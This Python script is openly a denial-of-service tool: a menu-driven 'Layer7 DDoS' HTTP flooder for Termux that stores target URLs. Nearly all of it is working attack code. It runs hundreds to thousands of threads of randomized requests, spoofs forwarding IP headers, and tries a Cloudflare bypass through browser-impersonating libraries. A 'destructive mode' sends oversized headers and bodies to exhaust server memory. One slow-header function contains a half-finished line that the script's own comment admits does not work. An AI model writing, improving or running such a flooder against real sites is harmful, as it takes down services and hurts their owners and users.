#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Layer7 HTTP Flood - Termux Optimized with Cloudflare Bypass & High Destruction
# Requirements: pkg install python libffi openssl rust clang -y && pip install requests cloudscraper curl_cffi colorama urllib3 h2
# If cloudscraper or curl_cffi fail, the script falls back to standard requests engine.

import requests
import threading
import random
import time
import sys
import os
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

# === COLORAMA SETUP ===
try:
    from colorama import init, Fore, Style
    init(autoreset=True)
    GREEN = Fore.GREEN
    RED = Fore.RED
    YELLOW = Fore.YELLOW
    CYAN = Fore.CYAN
    MAGENTA = Fore.MAGENTA
    RESET = Style.RESET_ALL
except:
    GREEN = RED = YELLOW = CYAN = MAGENTA = RESET = ""

# === ATTEMPT TO IMPORT BYPASS ENGINES ===
CF_BYPASS_ENGINE = None  # 'cloudscraper' or 'curl_cffi' or None

try:
    import cloudscraper
    scraper = cloudscraper.create_scraper()
    CF_BYPASS_ENGINE = 'cloudscraper'
except:
    pass

if CF_BYPASS_ENGINE is None:
    try:
        from curl_cffi import requests as curl_requests
        CF_BYPASS_ENGINE = 'curl_cffi'
    except:
        pass

# === CONFIGURATION FILE ===
CONFIG_FILE = "targets.json"

# === GLOBAL ATTACK PARAMETERS ===
TARGET_URL = ""
THREAD_COUNT = 200
DURATION = 300
TIMEOUT = 5
BYPASS_MODE = False          # Enable Cloudflare bypass mode
DESTRUCTIVE_MODE = True      # Enable additional attack vectors (slow headers, large payloads)
HTTP2_MODE = False           # Use HTTP/2 if available (needs h2 library)

# === USER AGENT POOL (Realistic Modern Browsers) ===
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 14; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
]

# === DATA STORAGE FUNCTIONS ===
def load_targets():
    """Load targets from JSON file"""
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                data = json.load(f)
                return data.get('targets', [])
        except:
            return []
    return []

def save_targets(targets_list):
    """Save targets to JSON file"""
    data = {'targets': targets_list}
    with open(CONFIG_FILE, 'w') as f:
        json.dump(data, f, indent=2)

def add_target(name, url):
    targets = load_targets()
    targets.append({'name': name, 'url': url})
    save_targets(targets)
    print(f"{GREEN}[+] Target '{name}' added.{RESET}")

def remove_target(name):
    targets = load_targets()
    new_targets = [t for t in targets if t['name'] != name]
    if len(new_targets) < len(targets):
        save_targets(new_targets)
        print(f"{GREEN}[+] Target '{name}' removed.{RESET}")
    else:
        print(f"{RED}[!] Not found.{RESET}")

def list_targets():
    targets = load_targets()
    if not targets:
        print(f"{YELLOW}[*] No saved targets.{RESET}")
        return []
    print(f"\n{CYAN}--- Saved Targets ---{RESET}")
    for idx, t in enumerate(targets, 1):
        print(f"  {idx}. {t['name']} -> {t['url']}")
    print()
    return targets

def select_target():
    """Menu to select target"""
    global TARGET_URL
    while True:
        os.system('clear' if 'termux' in os.environ.get('PREFIX', '') else 'cls')
        print(f"{MAGENTA}=== TARGET MENU ==={RESET}")
        targets = load_targets()
        if targets:
            for idx, t in enumerate(targets, 1):
                print(f"  [{idx}] {t['name']} - {t['url']}")
        else:
            print(f"  {YELLOW}No saved targets{RESET}")
        print(f"\n  [A] Add new target")
        print(f"  [R] Remove target")
        print(f"  [C] Custom URL (temp)")
        print(f"  [Q] Quit")
        choice = input(f"\n{CYAN}Select: {RESET}").strip().lower()
        if choice == 'a':
            name = input("Name: ").strip()
            url = input("URL (http/https): ").strip()
            if url:
                add_target(name, url)
        elif choice == 'r':
            name = input("Name to remove: ").strip()
            remove_target(name)
        elif choice == 'c':
            url = input("URL: ").strip()
            if url:
                TARGET_URL = url
                return url
        elif choice == 'q':
            sys.exit(0)
        elif choice.isdigit():
            idx = int(choice) - 1
            if 0 <= idx < len(targets):
                TARGET_URL = targets[idx]['url']
                print(f"{GREEN}[+] Selected: {targets[idx]['name']} -> {TARGET_URL}{RESET}")
                time.sleep(1)
                return TARGET_URL
        else:
            print(f"{RED}[!] Invalid.{RESET}")
            time.sleep(0.5)

def configure_attack():
    """Configure attack parameters including bypass/destructive modes"""
    global THREAD_COUNT, DURATION, TIMEOUT, BYPASS_MODE, DESTRUCTIVE_MODE, HTTP2_MODE
    while True:
        os.system('clear' if 'termux' in os.environ.get('PREFIX', '') else 'cls')
        print(f"{MAGENTA}=== ATTACK CONFIGURATION ==={RESET}")
        print(f"1. Threads: {THREAD_COUNT}")
        print(f"2. Duration: {DURATION}s")
        print(f"3. Timeout: {TIMEOUT}s")
        print(f"4. Cloudflare Bypass: {GREEN if BYPASS_MODE else RED}{BYPASS_MODE}{RESET}")
        print(f"5. Destructive Mode: {GREEN if DESTRUCTIVE_MODE else RED}{DESTRUCTIVE_MODE}{RESET}")
        print(f"6. HTTP/2 Mode: {GREEN if HTTP2_MODE else RED}{HTTP2_MODE}{RESET} (if available)")
        print(f"7. Back to Main Menu")
        choice = input(f"\n{CYAN}Choice: {RESET}").strip()
        if choice == '1':
            try:
                THREAD_COUNT = int(input("Threads (10-2000): ").strip())
                THREAD_COUNT = max(10, min(2000, THREAD_COUNT))
            except: pass
        elif choice == '2':
            try:
                DURATION = int(input("Duration (sec): ").strip())
                DURATION = max(10, DURATION)
            except: pass
        elif choice == '3':
            try:
                TIMEOUT = int(input("Timeout (1-15): ").strip())
                TIMEOUT = max(1, min(15, TIMEOUT))
            except: pass
        elif choice == '4':
            BYPASS_MODE = not BYPASS_MODE
            if BYPASS_MODE and CF_BYPASS_ENGINE is None:
                print(f"{RED}[!] No bypass engine available. Install cloudscraper or curl_cffi.{RESET}")
                BYPASS_MODE = False
                time.sleep(1)
        elif choice == '5':
            DESTRUCTIVE_MODE = not DESTRUCTIVE_MODE
        elif choice == '6':
            HTTP2_MODE = not HTTP2_MODE
            if HTTP2_MODE:
                try:
                    import h2
                except:
                    print(f"{RED}[!] h2 library not found. Install with: pip install h2{RESET}")
                    HTTP2_MODE = False
                    time.sleep(1)
        else:
            break

# === ATTACK FUNCTIONS ===
def get_random_headers():
    """Headers that mimic real browser and bypass basic checks"""
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Language": random.choice(["en-US,en;q=0.9", "en-GB,en;q=0.8", "id-ID,id;q=0.9"]),
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control": random.choice(["no-cache", "max-age=0"]),
        "Sec-Ch-Ua": '"Google Chrome";v="120", "Chromium";v="120", "Not=A?Brand";v="24"',
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": random.choice(['"Windows"', '"macOS"', '"Linux"']),
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Upgrade-Insecure-Requests": "1",
        "Connection": "keep-alive",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        "X-Real-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        "Referer": random.choice(["https://google.com/", "https://bing.com/", "https://duckduckgo.com/"])
    }
    return headers

def get_random_params():
    """Random query parameters to bypass caching"""
    return {
        "q": str(random.randint(10000, 99999)),
        "page": str(random.randint(1, 50)),
        "id": str(random.randint(1, 9999)),
        "ref": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)),
        "token": ''.join(random.choices('abcdef0123456789', k=32)),
        "t": str(int(time.time() * 1000))
    }

# === DESTRUCTIVE PAYLOAD GENERATORS ===
def generate_slow_headers():
    """Large headers to exhaust server memory"""
    big_value = "A" * random.randint(4000, 8000)  # 4-8KB per header
    return {
        "X-Custom-1": big_value,
        "X-Custom-2": big_value,
        "X-Custom-3": big_value,
        "User-Agent": random.choice(USER_AGENTS) + big_value[:1000]
    }

def generate_large_post_body():
    """POST body of random size (10-50KB)"""
    size = random.randint(10*1024, 50*1024)
    return {'data': 'A' * size}

# === CORE REQUEST ENGINES ===
def make_request_normal(session, method='GET'):
    """Standard requests without bypass"""
    headers = get_random_headers()
    params = get_random_params()
    try:
        if method == 'GET':
            url = TARGET_URL if "?" not in TARGET_URL else TARGET_URL.split("?")[0]
            resp = session.get(url, headers=headers, params=params, timeout=TIMEOUT, allow_redirects=False)
        elif method == 'POST':
            resp = session.post(TARGET_URL, headers=headers, data=generate_large_post_body(), timeout=TIMEOUT)
        else:  # HEAD
            resp = session.head(TARGET_URL, headers=headers, timeout=TIMEOUT)
        return resp.status_code
    except:
        return None

def make_request_cf_bypass(session, method='GET'):
    """Cloudflare bypass request using cloudscraper or curl_cffi"""
    headers = get_random_headers()
    params = get_random_params()
    try:
        if CF_BYPASS_ENGINE == 'cloudscraper':
            if method == 'GET':
                resp = session.get(TARGET_URL, headers=headers, params=params, timeout=TIMEOUT)
            elif method == 'POST':
                resp = session.post(TARGET_URL, headers=headers, data=generate_large_post_body(), timeout=TIMEOUT)
            else:
                resp = session.head(TARGET_URL, headers=headers, timeout=TIMEOUT)
            return resp.status_code
        elif CF_BYPASS_ENGINE == 'curl_cffi':
            # curl_cffi interface similar to requests
            if method == 'GET':
                resp = curl_requests.get(TARGET_URL, headers=headers, params=params, timeout=TIMEOUT, impersonate="chrome110")
            elif method == 'POST':
                resp = curl_requests.post(TARGET_URL, headers=headers, data=generate_large_post_body(), timeout=TIMEOUT, impersonate="chrome110")
            else:
                resp = curl_requests.head(TARGET_URL, headers=headers, timeout=TIMEOUT, impersonate="chrome110")
            return resp.status_code
    except:
        return None

def destructive_request(session):
    """Mix of slow headers and large body to maximize impact"""
    try:
        # Slow headers attack (send headers slowly to keep connection open)
        sock = session.get_adapter('https://').poolmanager().connection_from_url(TARGET_URL)
        # Not easily implemented with pure requests; fallback to large header request
        headers = generate_slow_headers()
        resp = session.get(TARGET_URL, headers=headers, timeout=TIMEOUT)
        return resp.status_code
    except:
        return None

# === THREAD WORKER ===
def attack_thread(thread_id):
    """Each thread selects attack vector based on configuration"""
    # Initialize appropriate session
    if BYPASS_MODE:
        if CF_BYPASS_ENGINE == 'cloudscraper':
            session = cloudscraper.create_scraper()
        elif CF_BYPASS_ENGINE == 'curl_cffi':
            session = curl_requests.Session()
        else:
            session = requests.Session()
    else:
        session = requests.Session()
    
    session.verify = False
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    end_time = time.time() + DURATION
    req_count = 0
    err_count = 0
    
    while time.time() < end_time:
        try:
            # Choose method randomly
            method = random.choice(['GET', 'GET', 'POST', 'HEAD'])  # Bias GET
            
            if DESTRUCTIVE_MODE and random.random() < 0.3:  # 30% chance destructive
                status = destructive_request(session)
            else:
                if BYPASS_MODE:
                    status = make_request_cf_bypass(session, method)
                else:
                    status = make_request_normal(session, method)
            
            if status:
                req_count += 1
            else:
                err_count += 1
                
            # Dynamic delay to avoid local resource starvation
            if err_count > req_count * 0.5:
                time.sleep(random.uniform(0.05, 0.1))
            else:
                time.sleep(random.uniform(0.001, 0.005))
        except KeyboardInterrupt:
            break
        except:
            err_count += 1
            time.sleep(0.05)
    
    return thread_id, req_count, err_count

def display_stats(start_time, completed, total, requests_sent):
    elapsed = time.time() - start_time
    if elapsed > 0:
        rps = requests_sent / elapsed
        progress = (completed / total) * 100 if total > 0 else 0
        sys.stdout.write(f"\r{CYAN}[*] {GREEN}Threads: {completed}/{total} {YELLOW}| {GREEN}RPS: {rps:.1f} {YELLOW}| {GREEN}Elapsed: {elapsed:.0f}s {YELLOW}| {GREEN}Progress: {progress:.1f}%{RESET}")
        sys.stdout.flush()

def launch_attack():
    """Start DDoS with current config"""
    if not TARGET_URL:
        print(f"{RED}[!] No target selected.{RESET}")
        time.sleep(1)
        return
    
    os.system('clear' if 'termux' in os.environ.get('PREFIX', '') else 'cls')
    banner = f"""
{MAGENTA}╔═══════════════════════════════════════════╗
║   {RED}LAYER7 DDoS - DESTRUCTIVE EDITION    {MAGENTA}║
╠═══════════════════════════════════════════╣
║  {YELLOW}Target: {GREEN}{TARGET_URL}{' ' * (27 - len(TARGET_URL))}{MAGENTA}║
║  {YELLOW}Threads: {GREEN}{THREAD_COUNT}{' ' * (27 - len(str(THREAD_COUNT)))}{MAGENTA}║
║  {YELLOW}Duration: {GREEN}{DURATION}s{' ' * (23 - len(str(DURATION)))}{MAGENTA}║
║  {YELLOW}CF Bypass: {GREEN if BYPASS_MODE else RED}{BYPASS_MODE}{' ' * (16 - len(str(BYPASS_MODE)))}{MAGENTA}║
║  {YELLOW}Destructive: {GREEN if DESTRUCTIVE_MODE else RED}{DESTRUCTIVE_MODE}{' ' * (14 - len(str(DESTRUCTIVE_MODE)))}{MAGENTA}║
{MAGENTA}╚═══════════════════════════════════════════╝{RESET}
"""
    print(banner)
    print(f"{GREEN}[+] Launching attack...{RESET}")
    print(f"{YELLOW}[!] CTRL+C to stop{RESET}\n")
    
    start_time = time.time()
    total_requests = 0
    total_errors = 0
    
    try:
        with ThreadPoolExecutor(max_workers=THREAD_COUNT) as executor:
            futures = {executor.submit(attack_thread, i): i for i in range(THREAD_COUNT)}
            completed = 0
            for future in as_completed(futures):
                try:
                    tid, reqs, errs = future.result()
                    total_requests += reqs
                    total_errors += errs
                    completed += 1
                    display_stats(start_time, completed, THREAD_COUNT, total_requests)
                except:
                    completed += 1
    except KeyboardInterrupt:
        print(f"\n\n{RED}[!] Interrupted.{RESET}")
    finally:
        elapsed = time.time() - start_time
        print(f"\n\n{GREEN}[+] Summary:{RESET}")
        print(f"{CYAN}    Duration: {elapsed:.1f}s{RESET}")
        print(f"{CYAN}    Requests: {total_requests}{RESET}")
        print(f"{CYAN}    RPS: {total_requests/elapsed:.1f}{RESET}")
        print(f"{CYAN}    Errors: {total_errors}{RESET}")
        time.sleep(2)

def main_menu():
    while True:
        os.system('clear' if 'termux' in os.environ.get('PREFIX', '') else 'cls')
        print(f"{MAGENTA}========================================{RESET}")
        print(f"{MAGENTA}   LAYER7 DDoS - ULTIMATE MENU {RESET}")
        print(f"{MAGENTA}========================================{RESET}")
        cur = TARGET_URL if TARGET_URL else "Not set"
        print(f"{CYAN}Target: {GREEN}{cur}{RESET}")
        print(f"{CYAN}Threads: {THREAD_COUNT} | Duration: {DURATION}s | Timeout: {TIMEOUT}s | CF: {BYPASS_MODE} | Destructive: {DESTRUCTIVE_MODE}{RESET}")
        print(f"{MAGENTA}----------------------------------------{RESET}")
        print(f"  [1] Select Target")
        print(f"  [2] Configure Attack")
        print(f"  [3] Launch Attack")
        print(f"  [4] Exit")
        choice = input(f"\n{CYAN}Choice: {RESET}").strip()
        if choice == '1':
            select_target()
        elif choice == '2':
            configure_attack()
        elif choice == '3':
            if not TARGET_URL:
                print(f"{RED}[!] Set target first.{RESET}")
                time.sleep(1)
                continue
            launch_attack()
        elif choice == '4':
            sys.exit(0)
        else:
            print(f"{RED}[!] Invalid.{RESET}")
            time.sleep(0.5)

if __name__ == "__main__":
    if "termux" in os.environ.get('PREFIX', ''):
        print(f"{YELLOW}[*] Termux detected - adjusting limits{RESET}")
        THREAD_COUNT = min(THREAD_COUNT, 500)
        print(f"{YELLOW}[*] Thread count capped at {THREAD_COUNT}{RESET}")
    main_menu()
